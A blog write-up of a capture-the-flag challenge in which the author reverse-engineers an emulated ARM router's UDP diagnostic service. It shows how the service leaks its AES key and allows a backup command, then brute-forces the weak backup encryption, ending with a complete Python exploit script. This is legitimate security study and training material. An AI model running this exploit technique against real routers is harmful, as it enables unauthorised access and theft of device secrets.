---
layout: post
title: "A pwn2own like chall?"
categories: Vuln-Research
tags: Hacking Pwn
---

#ARMless Router
IoT: ARMlessRouter ⭐

This pwn2own-style challenge will allow you to remotely compromise an ARM router.

-   1. Map the attack surface
-   2. Exploit the vulnerable service
-   3. Retrieve the flag

<!--excerpt-->

When I first saw this challenge the "pwn2own style" made me say that this could be an interesting challenge, above all I would do the "research" on my own. I started it too late and passed the summer studying math for uni, so I didn't completed it, but I achieved some trophies... After some time I solved it locally and wanted to showcase my writeup, if you have read the other ones you know that I try to give the most complete analysis as far as I can.

We are given a [files.tgz](https://challenge.hexacon.fr/2023/iot/files.tgz) archive, it contains:

    rootfs.cpio: ASCII cpio archive (SVR4 with no CRC)
    run.sh:      Bourne-Again shell script, ASCII text executable
    zImage:      Linux kernel ARM boot executable zImage (little-endian)

In particular we will use `run.sh` to start the vulnerable router thanks to QEMU. Let's analyze it (`run.sh` contains the services that will be exposed when booted):

    #! /bin/bash
    
    #This is a simple script which starts the IOT
    
    # Your host will have a virtnet0 interface with IP 172.18.1.1
    # The iot will have 172.18.1.3 IP and you will be able to communicate
    # between your host and guest.
    
    # Note: the real device on the internet will have strong passwords and strong AES keys.
    #
    #Have fun.
    
    echo "Configuring tun/tap interface [root rights needed]"
    sudo tunctl -t virtnet0 -u $(id -un)
    
    echo "Configuring host interface IP [root rights needed]"
    echo "IP: 172.18.1.1/24"
    sudo ifconfig virtnet0 172.18.1.1 netmask 255.255.255.0
    
    echo ""
    echo "Inside qemu, eth1 is configure as: ifconfig eth1 172.18.1.3 netmask 255.255.255.0"
    echo ""
    echo "Press enter to launch firmware, press Enter after boot to get a root console"
    echo ""
    echo ""
    read blah
    
    echo "launching qemu"
    qemu-system-arm -M virt -kernel zImage -initrd rootfs.cpio -no-reboot -nographic \
            -device virtio-net,netdev=net0 -netdev user,id=net0,net=192.168.1.0/24 \
            -device virtio-net,netdev=net1 -netdev tap,ifname=virtnet0,id=net1,script=no,downscript=no

As we saw on `run.sh`, when we start the docker image some network services will start

    root@OpenWrt:/# netstat -atup
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      893/dropbear
    tcp        0      0 : :ssh                  : :*                    LISTEN      893/dropbear
    udp        0      0 0.0.0.0:1205            0.0.0.0:*                           1132/ddiag_server
The one that I was curious about was this `ddiag_server` , that exposes on UDP/1205 a service. We can easily find its location:

    root@OpenWrt:/# which ddiag_server
    /usr/bin/ddiag_server

Running 

    strings ddiag_server 
    tdH.
    /lib/ld-musl-armhf.so.1
    libssl.so.1.1
    __register_frame_info
    __stack_chk_guard
    memcpy
    strncmp
    strlen
    __stack_chk_fail
    memset
    memcmp
    strcmp
    strcpy
    __deregister_frame_info
    libcrypto.so.1.1
    fread
    free
    getenv
    perror
    sendto
    socket
    strncpy
    recvfrom
    bind
    malloc
    AES_set_decrypt_key
    AES_decrypt
    MD5_Final
    MD5_Init
    MD5_Update
    libgcc_s.so.1
    calloc
    _fini
    _init
    libc.so
    puts
    htons
    inet_ntoa
    snprintf
    exit
    popen
    __libc_start_main
    pclose
    OPENSSL_1_1_0
    diag_cpu
    Bad query!!
    free
    cat /proc/swaps
    /usr/bin/backup.sh
    /usr/bin/backup.sh -download
    %s: cpu queries
    cat /proc/cpuinfo
    cat /proc/loadavg
    uptime -p
    uptime -s
    CHANGE_AES_KEY
    AES key change to:
    disabled by configuration
    echo is asked!
    Error in getkey/setkey
    Error in get uptime
    Error in get cpuinfo
    get meminfo
    Error in backup
    unknown opcode
    diag_size
    diag_hostname
    diag_ifconfig
    %s: size query
    Bad size query!!
    df -h
    du -h /tmp 2>/dev/null | tail -1
    %s: hostname query
    Bad hostname query!!
    hostname -I
    hostname -A
    ifconfig
    %s: ifconfig query
    ip -4 a show dev lo
    ip -4 a show dev eth0
    ip -4 a show dev eth1
    ip -4 a show dev eth2
    ip -4 a show dev eth3
    ip -4 a show dev eth4
    Bad ifconfig query!!
    get interface IP
    Error in diag
    get hostname
    get disk size
    parse
    Daemon socket creation error!
    failed to bind socket
    NO_ENV_TEST_KEY_
    %s: pktsize %d, from %s
    Short packet: %d bytes
    BAD MAGIC expected %d got %d
    Length too big!! Max is %d, got %d!
    Header length too short!! Min is %d, got %d!
    Packet v1!
    Packet v2!
    Unknown version!
    Usage: %s 
    Starting udp ddiag server on port %d....
    aeskey:%16s
    receive error
    Received %d bytes
    checkmd5
    ddiag_exec_cmd
    level: %d: %s
    %02x
    version: 0x%02x, opcode: 0x%02x, len: 0x%02x, suboption: 0x%02x, unused: 0x%02x, magic: 0x%02x, h=%16s, data=%s
    short packet!!
    ddiag server md5
    hash is OK
    hash mismatch
    %s: Executing shell command: %s
    [truncated...]
    Error in command or no data
we can notice that this service can run, despite hardcoded, shell commands, and includes this interesting file: `backup.sh`

    root@OpenWrt:/usr/bin# cat backup.sh 
    #! /bin/sh
    
    echo "Saving everything that matters!"
    
    tar cfz /tmp/backup.tgz /etc/secret_flag >/dev/null 2>/dev/null
    
    #This will be changed in production!!
    export BACKUPAESKEY="temp_key_change_it"
    #This key is changed in production!!!
    #This is a default key for testing purpose.
    
    cd /tmp
    /usr/bin/bkp /tmp/backup.tgz >/dev/null
    if [ -z $1 ]
    then
    	echo done
    else
    	cat backup_conf.tgz.enc | base64
    fi
So the strategy is: 
1) Find a way to run this command
2) Retrieve the output
3) Decrypt the output to get the flag

Loading the binary on binja, we can see here the graph view:
![graph view](https://i.ibb.co/jZj4WpQ/Screenshot-from-2023-09-08-09-42-58.png)
An interesting function is recvfrom, this function makes comparisons and classify the various packet. A packet is in this form

    struct Packet {
    uint8_t version;
    uint8_t opcode;
    uint16_t length;
    uint8_t opcode2;
    uint8_t _pad;
    uint16_t magic;
    longlong hash[2]; // will be replaced with "ddiag server md5"
    char payload[400];
    };
`opcode` and `suboption` define a command to execute.
One of the first thing recvfrom does is to verfiy if magic bytes are 'HX'

    00011b00          if (((r2 != 0x5848 || (r2 == 0x5848 && r3_2 > 0x190)) || ((r2 == 0x5848 && r3_2 <= 0x190) && r3_2 <= 0x17)))
    00011afc          {
    00011af4              snprintf(&var_41c, 0x3ff, r2_1, r3_1, var_428_1);
    00011af8              goto label_11aa4;
    00011af8          }
Then if the first byte (version) must be 1 or 2,  version 1 packets are unencrypted while version 2 packets are encrypted with the AES key.

    00011b14              uint32_t r3_3 = ((uint32_t)*(int8_t*)arg1);
    00011b1c              char* r0_11;
    00011b1c              if (r3_3 == 1)
    00011b18              {
    00011b6c                  strcpy(&var_41c, "Packet v1!", r2, r3_3);
    00011b78                  sub_11bf8(3, &var_41c);
    00011b80                  r0_11 = sub_11654(arg1);
    00011b80              }
    00011b24              if (r3_3 == 2)
    00011b20              {
    00011bac                  strcpy(&var_41c, "Packet v2!", r2, r3_3);
    00011bb8                  sub_11bf8(3, &var_41c);
    00011bc0                  r0_11 = sub_1108c(arg1);
    00011bc0              }

As you may imagine v1 pack can only do informative tasks (get disk size, Ip, hostname, or echo input), and they are not what we will use to leak the flag.
Here v1 opcodes:

    000116a8          if (r3_3 == nullptr)
    000116ac          {
    0001174c              strcpy(&var_414, "get interface IP", r2, r3_3);
    00011758              sub_11bf8(0xa, &var_414);
    00011768              *(int16_t*)(r0 + 2) = 0x18;
    0001176c              r0_8 = sub_11510(arg1, r0);
    0001176c          }
    000116a8          if (r3_3 == 1)
    000116ac          {
    000117ac              strcpy(&var_414, "get hostname", r2, r3_3);
    000117b8              sub_11bf8(0xa, &var_414);
    000117c8              *(int16_t*)(r0 + 2) = 0x18;
    000117cc              r0_8 = sub_11414(arg1, r0);
    000117cc          }
    000116a8          if (r3_3 == 2)
    000116ac          {
    000117dc              strcpy(&var_414, "get disk size", r2, r3_3);
    000117e8              sub_11bf8(0xa, &var_414);
    000117f8              *(int16_t*)(r0 + 2) = 0x18;
    000117fc              r0_8 = sub_1132c(arg1, r0);
    000117fc          }
Whilst v2 packets can do basic stuff but also do the backup, that is where our flag is stored, and set AES_KEY

    00011138          if (r3_3 == 0x2b)
    00011134          {
    000112bc              strcpy(&var_41c, "backup", r2_1, r3_3);
    000112c8              sub_11bf8(0xa, &var_41c);
    000112d4              *(int16_t*)(r0 + 2) = 0x18;
    000112d8              int32_t r0_23;
    000112d8              r0_23 = sub_10d84(arg1, r0);
    000112e0              if (r0_23 == 0)
    000112dc              {
    000112e0                  r1_2 = "Error in backup";
    000112e0                  goto label_11228;
    000112e0              }
    000112e0          }
    00011120          if (r3_3 != 0x16)
    0001111c          {
    00011124          label_11124:
    00011124              r1_2 = "unknown opcode";
    00011128              goto label_11228;
    00011128          }
    000111f8          strcpy(&var_41c, "getkey/setkey", r2_1, r3_3);
    00011204          sub_11bf8(0xa, &var_41c);
    00011210          *(int16_t*)(r0 + 2) = 0x18;
    00011214          int32_t r0_13;
    00011214          r0_13 = sub_10fe8(arg1, r0);
    0001121c          if (r0_13 == 0)
    00011218          {
    0001121c              r1_2 = "Error in getkey/setkey";
    0001121c              goto label_11228;
    0001121c          }
Where 0x16 and 0x2b are the opcodes.

Let's start writing some code...

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    address = ("172.18.1.3", 1205)
    s.connect(address)
where SOCK_DGRAM is a datagram-based protocol. You send one datagram and get one reply and then the connection terminates
(remember the service listen on UDP).

Now we need to leak AES_Key, and then use it do the backup.
We need to create a class that will help us sending the packet
```python
class Packet:
		version: int			# uint8_t version;
		opcode: int			# uint8_t opcode;
		suboption: int			# uint8_t opcode2;
    	len: Optional[int] = None	# uint16_t length;
    	unused: int = 0			# uint8_t _pad;
    	magic: int = 0x5848  # b"HX"	# uint16_t magic;
    	h: Optional[bytes] = None	# longlong hash[2];
    	data: bytes = b""               # char payload[400];
```
and our pkt will be something like this:

    pc = Packet(version=2, opcode=0x16, suboption=0x1e, data=b"G")
Where 0x16 is the opcode of getkey/setkey, `getkey` and `setkey` function by checking the first byte of the data: if it is `G`, it will run `getkey`, and if it is `S`, it will run `setkey`. `CHANGE_AES_KEY` is set to `no`, so set will not actually be allowed to change the key. Notably, the reply packet is _NOT_ encrypted.

Running it we get:

    Response:  Packet(version=2, opcode=22, suboption=30, len=41, unused=0, magic=22600, h=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00', data=b'1234567812345678\x00')
    AES key:  b'1234567812345678'

We got the key, we can now construct a valid `backup` command:

    pkt = Packet(version=2, opcode=0x2b, suboption=0x29, data=b"backup")
    pkt.encrypt(key)
    s.send(pkt.to_bytes())
    resp = Packet.from_bytes(s.recv(4096))
    print("Backup:")
    print(resp.data.decode())

Executing it we get:

    Backup:
    Saving everything that matters!
    ss451sIMgDfkyd/WKre80oGFNiajVPYy7mLUM7gOO21Rdsn3i/RCThgfY/cZRlstAMrWzKgtxRr6
    9lejsr63OYiwexLLTgzy0q20KWOlVu7wO6yfn9y65KRQS5RYZojtG0G80srNEfv/HZZXTyBUKMD3
    G+t4cXDfROKfk3JV8QtEkTUerxYXuXbI0Bsx3EAEchL2CDABvZTg8B01aQg/QAl0EeEMQ7ID3vqO
    iTzCDyo=

Now we need to bruteforce the backup,  we decrypt the data using the AES cipher and attempts to unpad the result. The actual AES key is the MD5 of the first 4 bytes of the variable BACKUPAESKEY. The IV is hardcoded
in the binary and is "this_is_secretiv" This means that we can bruteforce the 2^32 possible key values.
If one starts with 0x8b1f (starting bytes of .tgz aka gzip signature), it will be a candidate and we can read its content with this code:

    def un_tar(tgz_file):
    	with tarfile.open(tgz_file, "r:gz") as tar:
    		file_list = tar.getnames()
    		for file_name in file_list:
    			file_info = tar.getmember(file_name)
    			if file_info.isfile():
    				with tar.extractfile(file_info) as file:
    					file_content = file.read()
    					print(f"Content of {file_name}:\n{file_content.decode('utf-8')}\n")

Running it we get:

    POSSIBLE CANDIDATE: 74656d70
    Content of etc/secret_flag:
    #This is not the real flag
    HEXACON{...}
    #only in prod

I want to conclude this post thanking Hexacon not only for the amazing challenge, but also because I won their "giveaway" training for Attacking the Linux Kernel

Final Python Script:
```python
import socket
import os
import struct
import dataclasses
import hashlib
from typing import Optional
from Crypto.Cipher import AES
import base64
from Crypto.Util.Padding import unpad
import itertools
from hashlib import md5
from multiprocessing import Pool
import tarfile
import sys

CUSTOM_FMT = "<BBHBBH16s"

@dataclasses.dataclass
class CustomPacket:
    pkt_version: int
    pkt_opcode: int
    pkt_suboption: int
    pkt_length: Optional[int] = None
    pkt_unused: int = 0
    pkt_magic: int = 0x5848  # magic value
    pkt_hash: Optional[bytes] = None
    pkt_data: bytes = b""

    def __post_init__(self):
        if self.pkt_length is None:
            self.pkt_length = 0x18 + len(self.pkt_data)
        if self.pkt_hash is None:
            self.pkt_hash = self.calculate_custom_hash()

    def calculate_custom_hash(self) -> bytes:
        tmp = self.pkt_hash
        self.pkt_hash = b"ddiag server md5"
        res = hashlib.md5(self.serialize_to_bytes()).digest()
        self.pkt_hash = tmp
        return res

    def serialize_to_bytes(self) -> bytes:
        return struct.pack(CUSTOM_FMT,
                           self.pkt_version, self.pkt_opcode, self.pkt_length, self.pkt_suboption,
                           self.pkt_unused, self.pkt_magic, self.pkt_hash) + self.pkt_data

    @classmethod
    def deserialize_from_bytes(cls, data: bytes) -> "CustomPacket":
        pkt_version, pkt_opcode, pkt_length, pkt_suboption, pkt_unused, pkt_magic, pkt_hash = struct.unpack(CUSTOM_FMT, data[:0x18])
        return cls(pkt_version=pkt_version, pkt_opcode=pkt_opcode, pkt_suboption=pkt_suboption,
                   pkt_length=pkt_length, pkt_unused=pkt_unused, pkt_magic=pkt_magic, pkt_hash=pkt_hash,
                   pkt_data=data[0x18:])

    def custom_encrypt(self, encryption_key):
        cipher = AES.new(encryption_key, mode=AES.MODE_ECB)
        data = self.pkt_data
        if len(data) % 16 != 0:
            data += b"\0" * (16 - len(data) % 16)
        self.pkt_data = cipher.encrypt(data)

def un_tar(tgz_file):
    with tarfile.open(tgz_file, "r:gz") as tar:
        file_list = tar.getnames()
        for file_name in file_list:
            file_info = tar.getmember(file_name)
            if file_info.isfile():
                with tar.extractfile(file_info) as file:
                    file_content = file.read()
                    print(f"Content of {file_name}:\n{file_content.decode('utf-8')}\n")
                    sys.exit(0)

def brute_it(prefix):
    print("Trying", prefix.hex())
    for b3, b4 in itertools.product(reversed(range(128)), repeat=2):
        shortkey = prefix + bytes([b3, b4])
        key = md5(shortkey).digest()
        cipher = AES.new(key, mode=AES.MODE_CBC, iv=b"this_is_secretiv")
        try:
            dec = unpad(cipher.decrypt(data), 16)
        except Exception as e:
            continue

        if dec.startswith(b"\x1f\x8b"):
            print("POSSIBLE CANDIDATE:", shortkey.hex())
            with open("candidate_%s.tgz" % shortkey.hex(), "wb") as outf:
                outf.write(dec)
            un_tar("candidate_%s.tgz" % shortkey.hex())

if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    address = ("172.18.1.3", 1205)
    s.connect(address)

    while True:
        pc = CustomPacket(pkt_version=2, pkt_opcode=0x16, pkt_suboption=0x1e, pkt_data=b"G")
        pc.pkt_data = os.urandom(16)
        s.send(pc.serialize_to_bytes())
        response = CustomPacket.deserialize_from_bytes(s.recv(4096))
        print(f"{pc=} {response=}\n")
        if response.pkt_suboption != 13:
            break

    print("Response: ", response)
    key = response.pkt_data[:16]
    print("AES key: ", key)

    pkt = CustomPacket(pkt_version=2, pkt_opcode=0x2b, pkt_suboption=0x29, pkt_data=b"backup")
    pkt.custom_encrypt(key)
    s.send(pkt.serialize_to_bytes())
    resp = CustomPacket.deserialize_from_bytes(s.recv(4096))
    print("Backup:")
    print(resp.pkt_data.decode())
    data = resp.pkt_data.decode().split("Saving everything that matters!\n")[1]
    data = base64.b64decode(data)
    prefixes = [bytes([b1, b2]) for b1, b2 in itertools.product(reversed(range(128)), repeat=2)]
    p = Pool()
    for result in p.imap_unordered(brute_it, prefixes):
        pass
```
